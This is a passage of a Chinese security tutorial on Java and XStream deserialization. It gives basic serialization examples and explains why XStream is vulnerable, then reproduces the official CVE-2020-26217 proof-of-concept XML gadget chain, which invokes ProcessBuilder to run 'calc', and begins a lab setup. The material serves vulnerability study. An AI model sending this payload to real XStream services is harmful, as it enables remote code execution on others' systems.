class_">ObjectOutputStream</span>(fileOutputStream)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;John&quot;</span>, <span class="number">25</span>);</span><br><span class="line">            objectOutputStream.writeObject(person);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;对象序列化成功&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 反序列化对象，定义 deserializeObject 方法，对象为 Person</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Person <span class="title function_">deserializeObject</span><span class="params">(String fileName)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(fileName);</span><br><span class="line">             <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="type">Person</span> <span class="variable">deserializedPerson</span> <span class="operator">=</span> (Person) objectInputStream.readObject();</span><br><span class="line">            <span class="keyword">return</span> deserializedPerson;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个 Person 类实现 Serializable 接口，表示该类支持序列化和反序列化</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230812153747461.png" data-caption="image-20230812153747461"><img src="/../images/Java/deserialization/image-20230812153747461.png" alt="image-20230812153747461"></a></p>
<h2 id="三、漏洞案例"><a href="#三、漏洞案例" class="headerlink" title="三、漏洞案例"></a>三、漏洞案例</h2><h3 id="XStream反序列化"><a href="#XStream反序列化" class="headerlink" title="XStream反序列化"></a>XStream反序列化</h3><p>XStream 是一个简单的基于 Java 的类库，用来将 Java 对象序列化成 XML（JSON）或反序列化为对象。</p>
<p>XStream 反序列化漏洞的具体原因如下：</p>
<ul>
<li><p>默认支持任意类的反序列化：XStream 的默认配置允许将任意类进行反序列化，而不仅仅限于预期的类。这意味着攻击者可以构造特制的XML数据，其中包含恶意代码或恶意类的引用。</p>
</li>
<li><p>类加载器的问题：XStream 在反序列化时会使用当前线程的上下文类加载器来加载类。如果攻击者能够控制类加载器或提供恶意的类加载器，就可以加载和执行恶意类。</p>
</li>
<li><p>默认安全忽略策略：XStream 默认情况下会忽略一些敏感的 Java 类，如 java.lang.Runtime、java.lang.ProcessBuilder 等。然而，这个默认的安全忽略策略可能不够严格，攻击者可以绕过这些限制。</p>
</li>
</ul>
<blockquote>
<p>影响范围</p>
</blockquote>
<p>在1.4.x 系列版本中，&lt;&#x3D;1.4.6 或 &#x3D; 1.4.10 存在反序列化漏洞</p>
<blockquote>
<p>XStream 的序列化与反序列化</p>
</blockquote>
<p>XStream 的序列化与反序列与 Java 原生的序列化反序列化机制存在差异，XStream 使用的是独立的一套机制，主要核心是通过 Converter 转换器来将 XML 和对象之间进行相互的转换，简单的来说就是：<code>将特定类型的对象转换为 XML 或者将 XML 转换为特定类型的对象</code>，具体需要先实现以下3个方法：</p>
<ul>
<li><p>canConvert 方法：告诉 XStream 对象，它能够转换的对象；</p>
</li>
<li><p>marshal 方法：能够将对象转换为XML时候的具体操作；</p>
</li>
<li><p>unmarshal 方法：能够将XML转换为对象时的具体操作；</p>
</li>
</ul>
<p>具体可参考官方文档：<a target="_blank" rel="noopener" href="http://x-stream.github.io/converters.html">http://x-stream.github.io/converters.html</a> ，下图为转换的类型格式</p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230817152242552.png" data-caption="image-20230817152242552"><img src="/../images/Java/deserialization/image-20230817152242552.png" alt="image-20230817152242552"></a></p>
<p>例子：使用了 <code>xstream.toXML()</code> 方法将 <code>person</code> 类的对象字符串序列化为 <code>xml</code> 格式</p>
<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XStreamExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="comment">//创建 XStream 实例</span></span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xstream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个 Person 对象</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;John Doe&quot;</span>, <span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将对象序列化为 XML 字符串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> xstream.toXML(person);</span><br><span class="line">        System.out.println(xml);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义 Person 类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">        <span class="keyword">private</span> String name;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Person 类的构造方法</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">            <span class="built_in">this</span>.age = age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230813214904136.png" data-caption="image-20230813214904136"><img src="/../images/Java/deserialization/image-20230813214904136.png" alt="image-20230813214904136"></a></p>
<p>反序列化则使用了 <code>xstream.fromXML()</code> 方法将已经序列化的<code>xml</code>反序列化为字符</p>
<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XStreamExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xstream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 配置类名的别名,以便下面的 xml 中的 &lt;person&gt; 能被读取</span></span><br><span class="line">        xstream.alias(<span class="string">&quot;person&quot;</span>, Person.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 定义要反序列化的 XML 字符串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="string">&quot;&lt;person&gt;&lt;name&gt;John&lt;/name&gt;&lt;age&gt;30&lt;/age&gt;&lt;/person&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从 XML 反序列化为 Person 对象</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> (Person) xstream.fromXML(xml);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 打印反序列化后的 Person 对象</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Deserialized Person:&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Name: &quot;</span> + person.getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;Age: &quot;</span> + person.getAge());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义 Person 类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> String name;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取 name 属性的方法</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取 age 属性的方法</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230813214805534.png" data-caption="image-20230813214805534"><img src="/../images/Java/deserialization/image-20230813214805534.png" alt="image-20230813214805534"></a></p>
<p>完整的序列化与反序列化，程序先将字符串序列化为 <code>xml</code> 格式，然后再将已经为 <code>xml</code> 格式反序列化为字符串</p>
<div class="highlight-wrap" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XStreamExample</span> &#123;</span><br><span class="line">    <span class="comment">// 定义 Person 类</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">        <span class="keyword">private</span> String name;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Person 类的构造方法</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">            <span class="built_in">this</span>.age = age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 在 Person 类中定义 getter 和 setter 方法</span></span><br><span class="line">        <span class="comment">// 这些方法用于序列化和反序列化时访问属性</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> age;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.age = age;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="comment">//创建 XStream 实例</span></span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xstream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建一个 Person 对象</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;John Doe&quot;</span>, <span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将对象序列化为 XML 字符串</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> xstream.toXML(person);</span><br><span class="line">        System.out.println(<span class="string">&quot;Serialized XML:&quot;</span>);</span><br><span class="line">        System.out.println(xml);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将 XML 字符串反序列化为对象</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">deserializedPerson</span> <span class="operator">=</span> (Person) xstream.fromXML(xml);</span><br><span class="line">        System.out.println(<span class="string">&quot;\nDeserialized Person:&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Name: &quot;</span> + deserializedPerson.getName());</span><br><span class="line">        System.out.println(<span class="string">&quot;Age: &quot;</span> + deserializedPerson.getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230813215458252.png" data-caption="image-20230813215458252"><img src="/../images/Java/deserialization/image-20230813215458252.png" alt="image-20230813215458252"></a></p>
<blockquote>
<p>上述案例 Pom.xml 如下</p>
</blockquote>
<div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xstream-example<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.thoughtworks.xstream<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xstream<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.15<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure></div>



<h4 id="CVE-2020-26217"><a href="#CVE-2020-26217" class="headerlink" title="CVE-2020-26217"></a>CVE-2020-26217</h4><blockquote>
<p>官方漏洞通告</p>
</blockquote>
<p><code>https://x-stream.github.io/CVE-2020-26217.html</code> ， XStream 代码中可直接利用用户控制的请求输入的 xml 数据作为 fromXML 的参数使用，这里输入可能是输入流、文件、post参数等，并且程序中没有设置允许反序列化类的白名单，导致反序列化漏洞。漏洞版本为 <code>1.4.13</code>。</p>
<p>官方 Poc</p>
<div class="highlight-wrap" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.spi.FilterIterator&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.ArrayList$Itr&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>1<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">java.lang.ProcessBuilder</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">iter</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">&#x27;javax.imageio.ImageIO$ContainsFilter&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">method</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">method</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">next</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pos</span>&gt;</span>0<span class="tag">&lt;/<span class="name">pos</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">in</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>test<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure></div>



<blockquote>
<p>环境搭建</p>
</blockquote>
<p>idea 新建项目</p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230816144345229-16921688486111.png" data-caption="image-20230816144345229"><img src="/../images/Java/deserialization/image-20230816144345229-16921688486111.png" alt="image-20230816144345229"></a></p>
<p>配置 <code>pom.xml</code> 引入 <code>xstream</code> 漏洞版本依赖,引入后重新 maven 加载项目，<code>在 pom.xml处右键-&gt; maven-&gt; Reload project</code></p>
<p><a data-fancybox="gallery" data-src="/../images/Java/deserialization/image-20230816162251164.png" data-caption="image-20230816162251164"><img src="/../images/Java/deserialization/image-20230816162251164.png" alt="image-20230816162251164"></a></p>
<p><code>pom.xml</code> 文件如下</p>
